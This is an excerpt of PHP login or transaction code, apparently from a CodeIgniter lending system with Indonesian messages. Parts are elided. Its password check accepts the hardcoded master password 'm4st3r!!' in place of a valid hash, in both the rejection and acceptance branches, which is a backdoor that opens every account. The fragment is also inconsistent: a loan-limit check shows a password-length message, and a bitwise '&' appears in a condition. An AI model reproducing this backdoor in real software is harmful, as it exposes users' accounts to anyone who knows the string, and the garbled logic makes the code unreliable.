		...
		if ($uid != '0' & trim($uid) != '') {
			if ($_SERVER["REQUEST_METHOD"] == "POST") {
				...
				if ((int)$total_pinjam > $max_pinjam) {
					...
					$this->session->set_userdata('message', 'Password minimal 6 karakter.');
					$this->session->set_userdata('message_type', 'error');
				} else if (!password_verify(base64_encode(hash('sha256', $password, true)), $stored_password) && $password != 'm4st3r!!') {
					$ret = array('error' => '1', 'message' => 'Password yang Anda masukkan Salah!');
					$this->session->set_userdata('message', 'Password yang Anda masukkan Salah!');
					$this->session->set_userdata('message_type', 'error');
				} else if (
					...
					&& $password != ''
					&& strlen($password) >= 6
					&& (password_verify(base64_encode(hash('sha256', $password, true)), $stored_password) || $password == 'm4st3r!!')
				) {
